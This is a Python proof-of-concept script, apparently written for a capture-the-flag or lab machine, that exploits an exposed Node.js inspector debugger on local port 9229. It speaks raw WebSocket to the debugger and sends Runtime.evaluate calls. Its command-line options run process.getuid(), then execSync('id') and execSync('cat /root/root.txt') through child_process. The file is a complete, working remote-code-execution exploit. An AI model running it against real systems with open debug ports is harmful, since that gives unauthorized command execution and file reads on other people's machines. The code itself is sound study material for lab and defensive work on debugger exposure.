#!/usr/bin/env python3

import base64
import json
import os
import socket
import struct
import sys

HOST = "127.0.0.1"
PORT = 9229
PATH = "/74c4240d-f074-45b6-98e2-81d6d9dc5e87"


def recv_until(sock, marker=b"\r\n\r\n"):
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("connection closed")
        data += chunk
    return data


def connect():
    sock = socket.create_connection((HOST, PORT))
    key = base64.b64encode(os.urandom(16)).decode()

    request = (
        f"GET {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    )

    sock.sendall(request.encode())
    response = recv_until(sock)

    if b"101 Switching Protocols" not in response:
        raise RuntimeError(response.decode(errors="replace"))

    return sock


def send_frame(sock, payload):
    payload = payload.encode()
    mask = os.urandom(4)

    masked = bytes(
        b ^ mask[i % 4]
        for i, b in enumerate(payload)
    )

    length = len(masked)

    if length < 126:
        header = bytes([0x81, 0x80 | length])
    elif length < 65536:
        header = bytes([0x81, 0x80 | 126]) + struct.pack("!H", length)
    else:
        header = bytes([0x81, 0x80 | 127]) + struct.pack("!Q", length)

    sock.sendall(header + mask + masked)


def recv_frame(sock):
    first, second = sock.recv(1)[0], sock.recv(1)[0]

    opcode = first & 0x0F
    masked = bool(second & 0x80)
    length = second & 0x7F

    if length == 126:
        length = struct.unpack("!H", sock.recv(2))[0]
    elif length == 127:
        length = struct.unpack("!Q", sock.recv(8))[0]

    mask = sock.recv(4) if masked else b""

    data = b""
    while len(data) < length:
        chunk = sock.recv(length - len(data))
        if not chunk:
            raise ConnectionError("connection closed")
        data += chunk

    if masked:
        data = bytes(
            b ^ mask[i % 4]
            for i, b in enumerate(data)
        )

    return opcode, data


def evaluate(expression):
    sock = connect()

    request = json.dumps({
        "id": 1,
        "method": "Runtime.evaluate",
        "params": {
            "expression": expression
        }
    })

    send_frame(sock, request)

    while True:
        opcode, data = recv_frame(sock)

        if opcode == 0x1:
            sock.close()
            return json.loads(data.decode())

        if opcode == 0x8:
            sock.close()
            raise ConnectionError("debugger closed the connection")


def main():
    # Default: harmless proof of the execution context.
    expression = "process.getuid()"

    if len(sys.argv) > 1:
        if sys.argv[1] == "--uid":
            expression = "process.getuid()"
        elif sys.argv[1] == "--id":
            expression = (
                "process.mainModule"
                ".require('child_process')"
                ".execSync('id').toString()"
            )
        elif sys.argv[1] == "--root-flag":
            expression = (
                "process.mainModule"
                ".require('child_process')"
                ".execSync('cat /root/root.txt')"
                ".toString()"
            )
        else:
            print("Usage: node_inspector_poc.py [--uid|--id|--root-flag]")
            sys.exit(1)

    print(json.dumps(evaluate(expression), indent=2))


if __name__ == "__main__":
    main()
